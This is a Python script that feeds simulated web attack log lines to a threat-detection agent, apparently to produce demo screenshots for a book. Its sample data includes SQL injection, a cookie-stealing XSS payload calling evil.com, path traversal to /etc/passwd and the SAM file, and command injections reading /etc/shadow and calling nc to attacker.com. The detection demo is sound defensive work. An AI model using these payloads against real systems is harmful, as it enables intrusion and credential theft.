# Guarda esto como: generate_demo_threats.py

#!/usr/bin/env python3
"""
Generador de amenazas realistas para demos y screenshots
"""
import sys
sys.path.insert(0, 'src')
import asyncio
from datetime import datetime
from core.nemesis_agent import NemesisAgent

async def generate_demo_threats():
    print("=" * 70)
    print("📸 GENERANDO AMENAZAS REALISTAS PARA DEMOS")
    print("=" * 70)
    print()
    
    agent = NemesisAgent()
    
    # Amenazas realistas de diferentes tipos
    threats = [
        # SQL Injections
        ('203.0.113.50', 'GET /login?user=admin\' OR \'1\'=\'1\'-- HTTP/1.1'),
        ('198.51.100.42', 'POST /api/user?id=1 UNION SELECT password FROM users--'),
        ('192.0.2.100', 'GET /search?q=\' DROP TABLE users--'),
        
        # XSS Attacks
        ('45.33.32.156', 'GET /comment?text=<script>alert(document.cookie)</script>'),
        ('104.131.191.2', 'POST /forum?msg=<img src=x onerror=fetch(\'evil.com\'+document.cookie)>'),
        
        # Path Traversal
        ('185.220.101.3', 'GET /download?file=../../../../etc/passwd'),
        ('91.219.236.232', 'GET /view?page=../../../windows/system32/config/sam'),
        
        # Command Injection
        ('167.99.173.45', 'GET /ping?host=8.8.8.8; cat /etc/shadow'),
        ('159.65.94.183', 'POST /exec?cmd=ls -la; nc attacker.com 4444'),
        
        # Brute Force (simulado con múltiples intentos)
        ('89.248.172.16', 'POST /login user=admin pass=password123'),
        ('89.248.172.16', 'POST /login user=admin pass=admin123'),
        ('89.248.172.16', 'POST /login user=admin pass=letmein'),
        
        # DDoS patterns
        ('192.42.116.15', 'GET / HTTP/1.1'),
        ('192.42.116.15', 'GET / HTTP/1.1'),
        ('192.42.116.15', 'GET / HTTP/1.1'),
        
        # Tráfico legítimo (control)
        ('216.58.214.174', 'GET /index.html HTTP/1.1'),
        ('172.217.14.206', 'GET /api/status HTTP/1.1'),
        ('142.250.185.46', 'POST /api/data HTTP/1.1'),
    ]
    
    print("🎯 Procesando amenazas...\n")
    
    processed = 0
    malicious = 0
    benign = 0
    
    for ip, payload in threats:
        log_line = f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S")}] "{payload}" 403'
        
        verdict = await agent.process_log_line(log_line)
        
        if verdict:
            if verdict.is_malicious:
                malicious += 1
                icon = "🚨"
            else:
                benign += 1
                icon = "✅"
            
            print(f"{icon} {ip:15s} | {verdict.attack_type:20s} | {verdict.confidence:.0%}")
            processed += 1
        
        await asyncio.sleep(0.1)  # Pequeña pausa
    
    print()
    print("=" * 70)
    print(f"📊 RESUMEN:")
    print(f"   Total procesadas: {processed}")
    print(f"   🚨 Maliciosas:    {malicious}")
    print(f"   ✅ Legítimas:     {benign}")
    print("=" * 70)
    print()
    print("✅ Amenazas generadas para demos")
    print("   Ahora puedes:")
    print("   1. Abrir dashboard: python test_dashboard_unified.py")
    print("   2. Capturar screenshots para el libro")
    print("=" * 70)

asyncio.run(generate_demo_threats())